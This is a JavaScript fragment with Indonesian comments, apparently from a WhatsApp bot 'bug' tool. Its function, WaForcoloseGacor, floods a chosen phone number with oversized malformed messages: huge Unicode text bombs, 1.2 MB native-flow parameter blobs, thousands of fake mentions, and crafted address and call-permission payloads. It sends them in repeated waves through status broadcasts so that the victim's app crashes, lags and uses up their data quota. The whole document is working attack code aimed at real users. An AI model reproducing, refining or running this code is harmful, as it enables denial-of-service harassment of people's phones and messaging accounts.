...
//ForcoloseNuclear.js
//Force close + quota drain + system lag
async function WaForcoloseGacor(valtix, target) {
  const log = (m) => console.log(`[${new Date().toLocaleTimeString('id-ID')}] ${m}`);
  log(`💥 ForcoloseGacor → ${target.split('@')[0]}`);

  // bomb buffers
  const textBomb = "ꦽ".repeat(400_000); // 400k → cukup bikin client lag
  const stateBomb = "\x10".repeat(1_200_000); // 1.2 MB native params
  const mentions = Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9_000_000) + "@s.whatsapp.net");

  for (let w = 1; w <= 30; w++) {
    if (w % 5 === 0 || w === 30) log(`Wave ${w}/30`);

    // 1. Extended text bomb + mention
    const v1 = { viewOnceMessage: { message: { extendedTextMessage: {
      text: `Forcolose${w}` + textBomb,
      matchedText: textBomb,
      description: `Forcolose${w}`,
      previewType: "NONE",
      contextInfo: {
        isForwarded: true,
        ...
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "forcolose@newsletter",
            newsletterName: `Forcolose${w}` + textBomb,
            caption: `Forcolose${w}` + textBomb + "ោ៝".repeat(200_000),
    ...
    // 2. Galaxy message bomb (native flow crash layer)
    const v2 = { viewOnceMessage: { message: { interactiveResponseMessage: {
      body: { text: `Galaxy${w}`, format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: stateBomb,
        version: 3
      },
      entryPointConversionSource: "galaxy_message"
    }}}};

    // 3. Address message bomb (call permission crash)
    const v3 = { viewOnceMessage: { message: { interactiveResponseMessage: {
      body: { text: `Address${w}`, format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Forcolose\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${stateBomb}\"}}`,
        version: 3
      }
    }}}};

    // 4. Call permission bomb (1.2 MB)
    const v4 = { viewOnceMessage: { message: { interactiveResponseMessage: {
      body: { text: `Call${w}`, format: "DEFAULT" },
      nativeFlowResponseMessage: {
    ...
    // kirim 4 vector sekaligus via status@broadcast → nempel walau panel mati
    await Promise.all([
      valtix.relayMessage("status@broadcast", v1, { statusJidList: [target] }),
      valtix.relayMessage("status@broadcast", v2, { statusJidList: [target] }),
      valtix.relayMessage("status@broadcast", v3, { statusJidList: [target] }),
      valtix.relayMessage("status@broadcast", v4, { statusJidList: [target] })
    ]);

    await new Promise(r => setTimeout(r, 1_000)); // 1 detik antar wave
  }

  log("✅ ForcoloseGacor finished – WA will auto-close loop");
}
...
\`\`\``, {
        ...
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let a = 0; a < 50; a++) {
    await WaForcoloseGacor(valtix, jid);
    await new Promise(r => setTimeout(r, 1200)); // jeda tiap putaran
}
